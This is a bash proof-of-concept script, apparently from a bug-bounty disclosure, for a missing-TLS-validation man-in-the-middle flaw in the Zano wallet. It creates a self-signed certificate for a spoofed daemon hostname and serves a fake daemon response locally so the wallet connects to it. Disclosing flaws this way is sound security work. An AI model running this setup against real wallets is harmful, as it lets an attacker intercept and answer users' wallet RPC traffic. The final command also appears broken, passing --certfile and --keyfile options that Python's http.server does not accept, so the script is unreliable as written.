#!/usr/bin/env bash
# PoC for Zano wallet missing-TLS-validation MITM (Immunefi #49512).
#
# Demonstrates that the Zano wallet accepts a self-signed TLS certificate when connecting to a
# daemon over https, with no verification of CA, hostname, or expiry. A fake HTTPS "daemon" is
# enough to receive and answer the wallet's RPC traffic.
#
# Run this, then point a Zano wallet at https://127.0.0.1:8081 and observe it connects with no
# warning.
set -euo pipefail

WORK="$(mktemp -d)"
cd "$WORK"
echo "[*] Working dir: $WORK"

# 1) Self-signed certificate with no trust chain.
openssl req -x509 -newkey rsa:4096 -nodes \
  -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=fake.zano-daemon.com"

# 2) Minimal fake daemon response payload.
mkdir -p fake_daemon
echo '{"status": "OK", "info": "Fake Daemon Connected"}' > fake_daemon/index.html

# 3) Serve it over HTTPS with the self-signed cert.
echo "[*] Fake HTTPS daemon on https://127.0.0.1:8081"
echo "[*] Now configure the wallet with: { \"daemon_address\": \"https://127.0.0.1:8081\" }"
echo "[*] Expected: wallet connects with NO TLS warning; all RPC traffic hits this server."
python3 -m http.server 8081 --directory ./fake_daemon \
  --bind 127.0.0.1 --certfile cert.pem --keyfile key.pem
